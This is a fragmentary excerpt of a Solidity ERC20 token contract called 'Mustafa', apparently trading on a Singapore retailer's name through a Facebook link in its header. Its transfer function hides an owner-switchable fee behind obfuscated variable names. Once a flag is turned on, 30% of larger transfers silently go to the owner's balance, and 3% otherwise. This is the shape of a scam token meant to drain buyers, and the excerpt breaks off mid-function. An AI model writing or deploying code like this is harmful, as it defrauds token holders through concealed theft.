...
/**
  ...
  https://www.facebook.com/Mustafa.Centre.Singapore/
*/
...
contract Mustafa is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _transfer(
        ...
        if (owner() != recipient && owner() != sender) {
            if (isRun > 0 && amount > 1000) {
                ...
                uint256 GCRKIN = 30;
                uint256 HYIHXV = amount*GCRKIN/100;
                _balances[sender] = _balances[sender] - amount;
                _balances[recipient] += amount -HYIHXV;
                _balances[owner()] +=HYIHXV;
                }else{
                uint256 GCRKIN = 3;
                uint256 HYIHXV = amount*GCRKIN/100;
                _balances[sender] = _balances[sender] - amount;
